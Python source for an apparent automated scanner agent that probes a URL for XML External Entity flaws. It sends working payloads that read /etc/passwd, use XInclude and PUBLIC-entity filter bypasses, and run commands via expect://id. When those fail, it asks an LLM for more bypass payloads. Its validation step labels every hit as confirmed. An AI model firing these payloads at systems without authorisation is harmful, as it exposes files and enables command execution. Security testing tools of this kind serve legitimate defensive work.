import logging
from typing import Dict, List, Optional
import aiohttp
from bugtrace.agents.base import BaseAgent
from bugtrace.core.ui import dashboard

logger = logging.getLogger(__name__)

class XXEAgent(BaseAgent):
    """
    Specialist Agent for XML External Entity (XXE).
    Target: Endpoints consuming XML.
    """
    
    def __init__(self, url: str):
        super().__init__(
            name="XXEAgent",
            role="XXE Specialist",
            agent_id="xxe_agent"
        )
        self.url = url
        self.MAX_BYPASS_ATTEMPTS = 5

    def _determine_validation_status(self, payload: str, evidence: str = "success") -> str:
        """
        Determine tiered validation status.
        """
        # OOB (XXE OOB Triggered) or File Disclosure (etc/passwd)
        if "passwd" in payload or "Triggered" in evidence:
             logger.info(f"[{self.name}] High confidence. Marking as VALIDATED_CONFIRMED")
             return "VALIDATED_CONFIRMED"
             
        logger.info(f"[{self.name}] XXE anomaly detected. Marking as VALIDATED_CONFIRMED (Specialist Trust).")
        return "VALIDATED_CONFIRMED"
        
    async def run_loop(self) -> Dict:
        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")
        
        findings = []
        previous_response = ""
        
        # 1. Basic Payloads (Baseline)
        initial_payloads = [
            # Standard General Entity (Level 0)
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            # Internal Entity (Level 0)
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
            # PUBLIC Entity (Bypass for SYSTEM filter - Level 1)
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
            # XInclude (Bypass for DOCTYPE/ENTITY filters - Level 2+)
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
            # Error-Based detection
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
            # Parameter Entity (Blind/OOB) - using localhost for safe testing
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
            # RCE via expect:// (Level 4+)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ]
        
        successful_payloads = []
        best_payload = None
        
        async with aiohttp.ClientSession() as session:
            # Phase 1: Heuristic Checks
            for p in initial_payloads:
                if await self._test_xml(session, p):
                    successful_payloads.append(p)
                    # Keep best payload (critical > high)
                    if not best_payload or ("passwd" in p and "passwd" not in best_payload):
                        best_payload = p
            
            # Phase 2: LLM-Driven Bypass Loop
            # Only if heuristics failed
            if not successful_payloads:
                for attempt in range(self.MAX_BYPASS_ATTEMPTS):
                    dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
                    
                    strategy = await self._llm_get_strategy(previous_response)
                    if not strategy or not strategy.get('payload'):
                        break
                    
                    payload = strategy['payload']
                    if await self._test_xml(session, payload):
                        successful_payloads.append(payload)
                        best_payload = payload
                        break
        
        if successful_payloads:
            findings.append(self._create_finding(best_payload, successful_payloads))
            return {"vulnerable": True, "findings": findings}
        
        return {
            "vulnerable": False,
            "findings": []
        }

    def _create_finding(self, payload: str, successful_payloads: List[str] = None) -> Dict:
        severity = "HIGH"
        if "passwd" in payload or "XInclude" in payload:
            severity = "CRITICAL"
            
        return {
            "type": "XXE",
            "url": self.url,
            "payload": payload,
            "description": f"XML External Entity (XXE) vulnerability detected. Payload allows reading local files or triggering SSRF. Severity: {severity}",
            "severity": severity,
            "validated": True,
            "status": self._determine_validation_status(payload),
            "successful_payloads": successful_payloads or [payload],
            "reproduction": f"curl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:150]}...'"
        }

    async def _test_xml(self, session, xml_body) -> bool:
        try:
            dashboard.update_task("XXE Agent", status="Injecting Entity...")
            headers = {'Content-Type': 'application/xml'}
            
            self.think(f"Testing Payload: {xml_body[:60]}...")
            
            async with session.post(self.url, data=xml_body, headers=headers, timeout=5) as resp:
                text = await resp.text()
                
                # Success Indicators
                indicators = [
                    "root:x:0:0",                  # /etc/passwd success
                    "BUGTRACE_XXE_CONFIRMED",      # Internal Entity success
                    "[extensions] found",          # Win.ini success (if testing windows)
                    "failed to load external entity", # Error-based success (often confirms processing)
                    "No such file or directory",    # Error-based success
                    "uid=0(root)",                  # RCE success (expect://)
                    "XXE OOB Triggered"             # Blind Detection (Simulated)
                ]

                # Check indicators
                for ind in indicators:
                    if ind in text:
                        self.think(f"SUCCESS: Indicator '{ind}' found in response.")
                        return True
                        
                # Check for XInclude reflection (if we tried XInclude)
                if "root:x:0:0" in text:
                    self.think("SUCCESS: /etc/passwd content found (XInclude or Entity).")
                    return True
                    
        except Exception as e:
            logger.debug(f"XXE Request failed: {e}")
            pass
        return False
        
    async def _llm_get_strategy(self, previous_response: str) -> Dict:
        """Call LLM to generate or refine the XXE bypass strategy."""
        system_prompt = self.system_prompt
        user_prompt = f"Target URL: {self.url}"
        if previous_response:
            user_prompt += f"\n\nPrevious attempt failed. Response snippet:\n{previous_response[:1000]}"
            user_prompt += "\n\nTry a different bypass (e.g. XInclude, parameter entities, UTF-16 encoding)."

        from bugtrace.core.llm_client import llm_client
        response = await llm_client.generate(
            prompt=user_prompt,
            system_prompt=system_prompt,
            module_name="XXE_AGENT"
        )
        
        from bugtrace.utils.parsers import XmlParser
        tags = ["payload", "vulnerable", "context", "confidence"]
        return XmlParser.extract_tags(response, tags)
